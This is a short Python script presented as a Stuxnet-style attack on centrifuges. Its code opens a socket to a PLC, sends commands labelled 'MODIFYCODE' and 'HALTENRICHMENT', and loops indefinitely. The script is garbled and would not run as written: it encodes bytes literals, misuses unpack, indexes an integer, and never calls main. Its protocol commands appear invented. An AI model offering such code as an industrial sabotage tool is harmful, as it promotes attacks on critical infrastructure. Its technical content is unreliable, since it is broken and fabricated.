# Stuxnet Targeting Centrifuges
from time import sleep
from struct import pack, unpack
import socket

# Database Query Code
def database_query():
    # Connect to the Siemens PLC
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(('192.168.1.11', 502))
    conn.send(b"$GPRS_TEST\r\n".encode())
    res = conn.recv(1024)

    # Parse Response Data
    m = unpack("< B", res)[0]
    if m == 1:
        conn.send(b"START\r\n".encode())
        start_info = unpack("< i", conn.recv(4))[0]

        # Send Modified Code to PLC
        conn.send(b"MODIFYCODE\r\n".encode())
        conn.send(b"code modified\r\n".encode())
        conn.send(pack("< ii", 0xA0B0C0D0, start_info[0]))
        conn.send(pack("< ii", 0xA0B0C0D0, start_info[1]))
        conn.send(pack("< ii", 0xA0B0C0D0, start_info[2]))

        # Halt Enrichment Process
        conn.send(b"HALTENRICHMENT\r\n".encode())
    else:
        conn.close()
        print("Failed to execute query")

def main():
    try:
        while True:
            database_query()
    except KeyboardInterrupt:
        print("Execution halted")